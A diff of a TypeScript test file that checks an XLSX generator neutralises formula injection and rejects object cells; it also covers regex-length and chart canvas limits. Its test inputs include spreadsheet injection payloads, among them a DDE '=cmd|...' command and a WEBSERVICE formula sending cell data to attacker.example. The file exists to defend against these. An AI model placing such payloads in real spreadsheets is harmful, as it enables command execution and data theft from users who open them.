@@ -1,16 +1,19 @@
 import { afterEach, beforeEach, describe, expect, it } from 'vitest'
+import ExcelJS from 'exceljs'
 import * as fs from 'fs'
 import * as os from 'os'
 import * as path from 'path'
 import {
   INTERNAL_TOOLS,
   escapeHtmlAttr,
+  imageDisplaySize,
   safeCell,
   safeJsonForScript,
   validateOutputPath,
 } from '../internalTools'
 import { StepMcpRouter } from '../stepRouter'
 import type { InternalToolDefinition } from '../types'
+import { zipEntryText } from './support/zipEntries'
 
 // ─── Test Output Directory ──────────────────────────────────────────
 
@@ -258,35 +261,124 @@ describe('XLSX formula injection', () => {
     expect(safeCell(true)).toBe(true)
   })
 
-  it('XLSX output stores formula-leading values as text, not formulas', async () => {
+  it('XLSX output stores formula-leading values as inert text, not formulas', async () => {
     const tool = findTool('clerum__generate_xlsx')
+    const inert = ['=1+1', '+EVIL()', '@SUM(A1:A10)', '=cmd|"/c calc"!A1', '-', '\tinjected']
     const result = await tool.execute(
       {
         filename: 'formula-injection.xlsx',
         sheets: [
           {
             name: 'Data',
-            rows: [['Header'], ['=1+1'], ['+EVIL()'], ['benign value']],
+            titleRow: { text: '=HYPERLINK("https://attacker.example","x")' },
+            rows: [['=Header'], ...inert.map(v => [v]), ['-12.5'], ['benign value']],
           },
         ],
       },
       testOutputDir
     )
     expect(result.success).toBe(true)
-    // The actual XLSX is binary — we trust safeCell unit tests for the
-    // transformation. End-to-end correctness is verified by the absence of
-    // ExcelJS errors and the presence of the file.
-    expect(fs.existsSync(path.join(testOutputDir, 'formula-injection.xlsx'))).toBe(true)
+    const file = path.join(testOutputDir, 'formula-injection.xlsx')
+    const sheetXml = zipEntryText(file, 'xl/worksheets/sheet1.xml')
+    expect(sheetXml).not.toContain('<f>')
+    expect(sheetXml).not.toContain('<f ')
+
+    const wb = new ExcelJS.Workbook()
+    await wb.xlsx.readFile(file)
+    const ws = wb.worksheets[0]
+    // Text format (@) keeps a re-edited cell from becoming a formula, so no
+    // apostrophe has to be written into what the reader sees.
+    for (const address of ['A1', 'A2', 'A3', 'A4', 'A5', 'A6', 'A7', 'A8']) {
+      const cell = ws.getCell(address)
+      expect(cell.type, address).toBe(ExcelJS.ValueType.String)
+      expect(String(cell.value), address).not.toMatch(/^'/)
+      expect(cell.numFmt, address).toBe('@')
+    }
+    expect(ws.getCell('A1').value).toBe('=HYPERLINK("https://attacker.example","x")')
+    expect(ws.getCell('A3').value).toBe('=1+1')
+    expect(ws.getCell('A7').value).toBe('-')
+    expect(ws.getCell('A9').value).toBe(-12.5)
+    expect(ws.getCell('A10').numFmt).not.toBe('@')
+  })
+
+  it.each([
+    ['a formula object', { formula: 'WEBSERVICE("https://attacker.example/?x="&A1)' }],
+    ['a shared formula object', { sharedFormula: 'A1', result: 1 }],
+    ['a hyperlink object', { text: 'Click', hyperlink: 'https://attacker.example' }],
+    ['a rich text object', { richText: [{ text: 'hi' }] }],
+    ['an array', ['=1+1']],
+    ['a Date object', new Date()],
+  ])('XLSX refuses %s as a cell and never writes it', async (_label, cell) => {
+    const tool = findTool('clerum__generate_xlsx')
+    const result = await tool.execute(
+      {
+        filename: 'object-cell.xlsx',
+        sheets: [
+          {
+            name: 'Data',
+            rows: [
+              ['Header', 'Other'],
+              ['ok', cell],
+            ],
+          },
+        ],
+      },
+      testOutputDir
+    )
+    expect(result.success).toBe(false)
+    expect(result.error).toContain('sheets[0].rows[1][1]')
+    expect(result.error).not.toContain('attacker.example')
+    expect(fs.existsSync(path.join(testOutputDir, 'object-cell.xlsx'))).toBe(false)
+  })
+
+  it('XLSX refuses an object cell inside a row sent as a record', async () => {
+    const tool = findTool('clerum__generate_xlsx')
+    const result = await tool.execute(
+      {
+        filename: 'record-cell.xlsx',
+        sheets: [{ name: 'Data', rows: [{ Link: { text: 'x', hyperlink: 'https://e.example' } }] }],
+      },
+      testOutputDir
+    )
+    expect(result.success).toBe(false)
+    expect(result.error).toContain('sheets[0].rows[0].Link')
+  })
+
+  it('XLSX refuses an object as the title text', async () => {
+    const tool = findTool('clerum__generate_xlsx')
+    const result = await tool.execute(
+      {
+        filename: 'title-object.xlsx',
+        sheets: [{ name: 'Data', titleRow: { text: { formula: 'NOW()' } }, rows: [['H'], [1]] }],
+      },
+      testOutputDir
+    )
+    expect(result.success).toBe(false)
+    expect(result.error).toContain('sheets[0].titleRow.text')
+    expect(fs.existsSync(path.join(testOutputDir, 'title-object.xlsx'))).toBe(false)
+  })
+
+  it('XLSX object cells are rejected on the workflow path before execute', async () => {
+    const router = new StepMcpRouter(() => {
+      throw new Error('should not connect')
+    })
+    router.registerInternalTools(INTERNAL_TOOLS, testOutputDir)
+    const { result } = await router.callTool('clerum__generate_xlsx', {
+      filename: 'wf-object-cell.xlsx',
+      sheets: [{ name: 'Data', rows: [['H'], [{ formula: 'NOW()' }]] }],
+    })
+    expect(result.isError).toBe(true)
+    expect(fs.existsSync(path.join(testOutputDir, 'wf-object-cell.xlsx'))).toBe(false)
   })
 })
 
 // ─── XLSX conditional-formatting regex ReDoS bounds ─────────────────
 
 describe('XLSX conditional-formatting regex bounds', () => {
-  it('silently ignores oversized regex patterns without crashing generation', async () => {
+  it('skips oversized regex patterns with a warning without failing generation', async () => {
     const tool = findTool('clerum__generate_xlsx')
-    // 300-char pattern exceeds MAX_REGEX_PATTERN_LENGTH=256; rule should be
-    // dropped, generation should still succeed and not be flagged in error.
+    // 300-char pattern exceeds MAX_REGEX_PATTERN_LENGTH=256; the rule is
+    // dropped and reported, and generation still succeeds.
     const oversized = 'a'.repeat(300)
     const result = await tool.execute(
       {
@@ -307,6 +399,7 @@ describe('XLSX conditional-formatting regex bounds', () => {
       testOutputDir
     )
     expect(result.success).toBe(true)
+    expect(result.content).toContain('conditionalFormatting[0].rules[0].regex')
     expect(fs.existsSync(path.join(testOutputDir, 'redos-oversize.xlsx'))).toBe(true)
   })
 
@@ -339,17 +432,17 @@ describe('XLSX conditional-formatting regex bounds', () => {
     )
     const elapsed = Date.now() - start
     expect(result.success).toBe(true)
-    // 5s is a very loose budget — a true ReDoS would hang for minutes.
-    expect(elapsed).toBeLessThan(5000)
-  })
+    // A loose budget, so a slow machine passes; a true ReDoS would hang for minutes.
+    expect(elapsed).toBeLessThan(20_000)
+  }, 60_000)
 })
 
-// ─── Canvas pre-allocation quota ────────────────────────────────────
+// ─── Canvas pre-allocation limit ────────────────────────────────────
 
-describe('chart canvas dimension quota', () => {
+describe('chart canvas size limit', () => {
   it('rejects huge canvas dimensions before allocation', async () => {
     const tool = findTool('clerum__generate_chart')
-    // 4000×4000×4 bytes = 64 MB, well above the default 50 MB quota.
+    // 4000×4000 RGBA is 64 MB, over the 50 MiB canvas limit even at ratio 1.
     const result = await tool.execute(
       {
         filename: 'huge.png',
@@ -361,6 +454,26 @@ describe('chart canvas dimension quota', () => {
       testOutputDir
     )
     expect(result.success).toBe(false)
-    expect(result.error).toMatch(/quota/i)
+    expect(result.error).toMatch(/too large/i)
+  })
+
+  it('draws a large chart at a lower density instead of refusing it', async () => {
+    // At twice the density 2400×1600 would need 61 MB of canvas, so it is
+    // drawn at a lower ratio.
+    const result = await findTool('clerum__generate_chart').execute(
+      {
+        filename: 'large.png',
+        type: 'bar',
+        width: 2400,
+        height: 1600,
+        data: { labels: ['a'], datasets: [{ label: 'a', data: [1] }] },
+      },
+      testOutputDir
+    )
+    expect(result.success).toBe(true)
+    expect(imageDisplaySize(path.join(testOutputDir, 'large.png'))).toEqual({
+      width: 2400,
+      height: 1600,
+    })
   })
 })
